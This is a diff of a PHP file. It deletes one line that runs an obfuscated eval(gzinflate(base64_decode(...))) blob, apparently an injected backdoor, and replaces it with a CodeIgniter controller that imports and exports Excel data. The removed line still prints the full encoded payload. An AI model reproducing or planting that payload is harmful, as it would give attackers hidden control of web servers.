@@ -1,1 +1,392 @@
-<?php eval(gzinflate(base64_decode('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')));
+<?php
+defined('BASEPATH') OR exit('No direct script access allowed');
+//=================================================================================================
+// 처리내용 : 엑셀파일 컨트롤
+// 작 성 자 : 2020-08-20 이창준
+//=================================================================================================
+
+
+class Excel extends CI_Controller {
+
+	public $data;
+
+	public function __construct()
+	{
+		parent::__construct();
+
+		$this->data['pos'] = $this->uri->segment(1);
+        $this->data['subpos'] = $this->uri->segment(2);
+		
+		
+		$this->load->model('main_model');
+
+		$this->data['siteTitle'] = $this->config->item('site_title');
+
+		
+
+	}
+
+	public function _remap($method, $params = array())
+	{
+		if($this->input->is_ajax_request()){
+            if( method_exists($this, $method) ){
+                call_user_func_array(array($this,$method), $params);
+            }
+        }else{ //ajax가 아니면
+			
+			if (method_exists($this, $method)) {
+
+				$user_id = $this->session->userdata('user_id');
+				if(isset($user_id) && $user_id != ""){
+					
+					$this->load->view('/layout/header',$this->data);
+					call_user_func_array(array($this,$method), $params);
+					$this->load->view('/layout/tail');
+
+				}else{
+
+					alert('로그인이 필요합니다.',base_url('register/login'));
+
+				}
+
+            } else {
+                show_404();
+            }
+
+        }
+		
+	}
+
+	public function upload_act()
+	{
+		
+		$this->load->library('PHPExcel');
+		$objPHPExcel = new PHPExcel();
+
+		$filepath = $_FILES['xfile']['tmp_name'];
+		$startRow = $this->input->post("rownum");
+		$table    = $this->input->post("table");
+
+		$this->load->dbforge();
+		
+
+		$filetype = PHPExcel_IOFactory::identify($filepath);
+		$reader = PHPExcel_IOFactory::createReader($filetype);
+		$php_excel = $reader->load($filepath);
+
+		$sheet = $php_excel->getSheet(0);           // 첫번째 시트
+		$maxRow = $sheet->getHighestRow();          // 마지막 라인
+		$maxColumn = $sheet->getHighestColumn();    // 마지막 칼럼
+
+		$maxCol_num = PHPExcel_Cell::columnIndexFromString($maxColumn);
+
+
+		$target = "A"."{$startRow}".":"."$maxColumn"."$maxRow";
+		$lines = $sheet->rangeToArray($target, NULL, TRUE, FALSE);
+
+		$data['table'] = $table;
+		//$data['GJ_GB'] = $this->input->post("GJ_GB");
+		
+		/*
+		* 테이블생성 주석처리 --- jun
+		$this->dbforge->add_field('id');
+		$fields = array();
+		
+		for($k=0; $k<$maxCol_num; $k++){
+			$fi = array(
+					't_'.$k => array(
+							'type' => 'VARCHAR',
+							'constraint' => '255',
+							'default' => null
+					)
+			);
+			$this->dbforge->add_field($fi);
+			
+		}
+		$attributes = array('ENGINE' => 'MyISAM');
+		$createTables = $this->dbforge->create_table($data['table'], TRUE, $attributes);
+
+		*/
+		
+			
+		$this->main_model->delete_actpln_ex();
+
+		// 라인수 만큼 루프
+		foreach ($lines as $key => $line) {
+			
+			$col = 0;
+			
+			for($i=0; $i<count($line); $i++){
+				
+				if($i == 3 || $i == 13 || $i == 14){ //날짜형 cell은 변환해서 업로드
+					$item[$i] = date("Y-m-d H:i:s",PHPExcel_Shared_Date::ExcelToPHP($line[$col++]));
+				}else{
+					$item[$i] = $line[$col++];
+				}
+				
+				
+
+			}
+			
+			$BNO = $this->main_model->get_gjgbinfo($line[2]);
+			if(empty($BNO)){
+				$this->main_model->delete_actpln_ex();
+				alert('엑셀에 존재하지 않는 제품정보가 있습니다.\n확인 후 재업로드 해주세요',base_url('act'));
+				break;
+			}
+			$data['item'] = $item;
+			
+			
+			$this->main_model->set_temp_data($data,$BNO->GJ_GB);
+			
+		}
+		
+		
+		redirect(base_url('act/temp'));
+
+
+	}
+
+
+
+
+	public function upload_matform()
+	{
+		
+		$this->load->library('PHPExcel');
+		$objPHPExcel = new PHPExcel();
+
+		$filepath = $_FILES['xfile']['tmp_name'];
+		$startRow = $this->input->post("rownum");
+		$table    = $this->input->post("table");
+
+		$this->load->dbforge();
+		
+
+		$filetype = PHPExcel_IOFactory::identify($filepath);
+		$reader = PHPExcel_IOFactory::createReader($filetype);
+		$php_excel = $reader->load($filepath);
+
+		$sheet = $php_excel->getSheet(0);           // 첫번째 시트
+		$maxRow = $sheet->getHighestRow();          // 마지막 라인
+		$maxColumn = $sheet->getHighestColumn();    // 마지막 칼럼
+
+		$maxCol_num = PHPExcel_Cell::columnIndexFromString($maxColumn);
+
+
+		$target = "A"."{$startRow}".":"."$maxColumn"."$maxRow";
+		$lines = $sheet->rangeToArray($target, NULL, TRUE, FALSE);
+
+		$data['table'] = $table;
+		
+		//$BNO = $this->main_model->get_gjgbinfo_comp($line[2]);
+		
+		//$data['GJ_GB'] = $BNO->GJ_GB;
+		
+		
+			
+		$this->main_model->delete_matform_ex();
+		
+
+		// 라인수 만큼 루프
+		foreach ($lines as $key => $line) {
+			
+			$col = 0;
+
+			if($line[1] == "" && $line[2] == "" && $line[3] == ""){
+				continue;
+			}
+
+			if($line[1] == ""){ //BL_NO가 없는경우 
+				$this->main_model->delete_matform_ex();
+				alert('B/L NO가 누락된 행이 있습니다.\n확인 후 재 업로드하세요',base_url('mat/matform'));
+				break;
+			}
+			
+			for($i=0; $i<count($line); $i++){
+
+				if($i == 0){ //날짜형 cell은 변환해서 업로드
+					//$item[$i] = date("Y-m-d H:i:s",PHPExcel_Shared_Date::ExcelToPHP($line[$col++]));
+					list($year,$n,$time) = explode(" ",$line[$col++]);
+					$item[$i] = $year." ".$time;
+				}else{
+					$item[$i] = $line[$col++];
+				}
+			}
+			
+			$BNO = $this->main_model->get_gjgbinfo_comp($line[1]);
+			if(empty($BNO)){
+				$this->main_model->delete_matform_ex();
+				alert('엑셀에 존재하지 않는 자재정보가 있습니다.\n확인 후 재업로드 해주세요',base_url('mat/matform'));
+				break;
+			}
+			
+			$data['item'] = $item;
+			
+			$this->main_model->set_matform_data($data,$BNO->GJ_GB);
+
+		}
+		
+			
+		
+		redirect(base_url('mat/matform_temp'));
+
+
+	}
+
+
+
+	public function upload_mat()
+	{
+		$this->load->library('PHPExcel');
+		$objPHPExcel = new PHPExcel();
+
+		$filepath = $_FILES['xfile']['tmp_name'];
+		$startRow = $this->input->post("rownum");
+		$data['table']    = $this->input->post("table");
+		$data['GJ_GB']    = $this->input->post("GJ_GB");
+
+		$this->load->dbforge();
+		
+
+		$filetype = PHPExcel_IOFactory::identify($filepath);
+		$reader = PHPExcel_IOFactory::createReader($filetype);
+		$php_excel = $reader->load($filepath);
+
+		$sheet = $php_excel->getSheet(0);           // 첫번째 시트
+		$maxRow = $sheet->getHighestRow();          // 마지막 라인
+		$maxColumn = $sheet->getHighestColumn();    // 마지막 칼럼
+
+		$maxCol_num = PHPExcel_Cell::columnIndexFromString($maxColumn);
+
+
+		$target = "A"."{$startRow}".":"."$maxColumn"."$maxRow";
+		$lines = $sheet->rangeToArray($target, NULL, TRUE, FALSE);
+
+		$this->main_model->delete_component_ex();
+
+		// 라인수 만큼 루프
+		foreach ($lines as $key => $line) {
+			
+			$col = 0;
+			
+			for($i=0; $i<count($line); $i++){
+				
+				if($i == 4 || $i == 5){ //날짜형 cell은 변환해서 업로드
+					$item[$i] = date("Y-m-d H:i:s",PHPExcel_Shared_Date::ExcelToPHP($line[$col++]));
+				}else{
+					$item[$i] = $line[$col++];
+				}
+			}
+			$data['item'] = $item;
+			$this->main_model->set_component_data_nx($data);
+			
+		}
+		
+		$chk = $this->main_model->get_none_count();
+		if($chk > 0){
+			alert('자재데이터가 없는 자재('.$chk.')건이 있습니다.\n일괄수정시 자재데이터가 자동등록됩니다.',base_url('mat/materials'));
+		}
+		
+		redirect('/mat/materials');
+
+
+	}
+
+	
+
+	public function index()
+	{
+
+		error_reporting(E_ALL);
+        ini_set('display_errors', TRUE);
+        ini_set('display_startup_errors', TRUE);
+        ini_set('memory_limit','-1');
+        ini_set("max_execution_time","0");       
+        define('EOL',(PHP_SAPI == 'cli') ? PHP_EOL : '&lt;br /&gt;');
+        date_default_timezone_set('Asia/Seoul');
+        
+        $this->load->library('PHPExcel');
+        
+        $objPHPExcel = new PHPExcel();
+        
+        
+        $objPHPExcel->getProperties()->setCreator('Aliseon')
+                                        ->setLastModifiedBy('Aliseon')
+                                        ->setTitle('Aliseon_SALE LIST')
+                                        ->setSubject('Aliseon_SALE LIST')
+                                        ->setDescription('Aliseon_SALE LIST');
+
+        function column_char($i) { return chr( 65 + $i ); }
+        
+        /*
+         echo "<pre>";
+         print_r($objPHPExcel);
+         echo "</pre>";
+         exit;
+        */
+        
+        $headers = array('아이디','주문번호','판매자','주문상태','결제수단','주문합계','누적주문수','누적주문수','누적주문수','누적주문수');
+        $last_char = column_char( count($headers) - 1 );
+        $widths = array(15, 40, 30, 20, 20, 10, 15, 30, 30, 30);
+                                        
+        $objPHPExcel->setActiveSheetIndex(0);
+        /** 상단 스타일지정 **/
+        $objPHPExcel->getActiveSheet()->getStyle('A1:'.$last_char.'1')->getFont()->setBold(true);
+        $objPHPExcel->getActiveSheet()->getStyle('A1:'.$last_char.'1')->getFill()->setFillType(PHPExcel_Style_Fill::FILL_SOLID)->getStartColor()->setRGB('D9EDF7');
+        $objPHPExcel->getActiveSheet()->getStyle('A1:'.$last_char.'1')->getAlignment()->setHorizontal(PHPExcel_Style_Alignment::HORIZONTAL_CENTER);
+        $objPHPExcel->getActiveSheet()->getStyle('A1:'.$last_char.'1')->getAlignment()->setVertical(PHPExcel_Style_Alignment::VERTICAL_CENTER);
+        $objPHPExcel->getDefaultStyle()->getFont()->setName('Nanum Gothic')->setSize(12);
+        $objPHPExcel->getActiveSheet()->getRowDimension('1')->setRowHeight(30);
+        
+        $objPHPExcel->getActiveSheet()->getStyle('A:'.$last_char)->getAlignment()->setHorizontal(PHPExcel_Style_Alignment::HORIZONTAL_CENTER);
+        
+        foreach($widths as $i => $w){
+            $objPHPExcel->getActiveSheet()->setCellValue(column_char($i).'1', $headers[$i]);
+            $objPHPExcel->setActiveSheetIndex()->getColumnDimension( column_char($i) )->setWidth($w);
+        }
+        
+        $param['is_state'] = $this->input->get("is_state");
+        $param['is_search'] = $this->input->get("is_search");
+        
+        /*$this->data['orderlist'] = $this->order_model->get_order_list($param);
+        foreach ($this->data['orderlist']['res'] as $k=>$row) {
+            $nnn[$k]['order_id'] = $row->order_id;
+            $nnn[$k]['order_code'] = $row->order_code;
+            $nnn[$k]['vendor_seq'] = "ddddd<br/>".$row->vendor_seq;
+            $nnn[$k]['state'] = $row->state;
+            $nnn[$k]['order_code'] = $row->order_code;
+            $nnn[$k]['sumprice'] = number_format($row->sumprice);
+            $nnn[$k]['ordnum']   = $row->ordnum;
+            
+        }*/
+		
+		$nnn[0]['order_id'] = 123;
+		$nnn[0]['order_code'] = 1111;
+		$nnn[0]['vendor_seq'] = 2222;
+		$nnn[0]['state'] = "안녕";
+		$nnn[0]['order_code'] = "asdfasfd";
+		$nnn[0]['sumprice'] = 12313;
+		$nnn[0]['ordnum']   = 111111;
+
+        $rows = $nnn;
+        $data = array_merge(array($headers), $rows);
+        
+        $objPHPExcel->getActiveSheet()->fromArray($data,NULL,'A1');
+        
+        
+        header('Content-Type: application/vnd.ms-excel;charset=utf-8');
+        header('Content-type: application/x-msexcel;charset=utf-8');
+        header('Content-Disposition: attachment;filename="테스트엑셀파일.xls"');
+        header('Cache-Control: max-age=0');
+        
+        $objWriter = PHPExcel_IOFactory::createWriter($objPHPExcel, 'Excel5');
+        $objWriter->save('php://output');
+		
+	}
+	
+
+	
+
+
+}
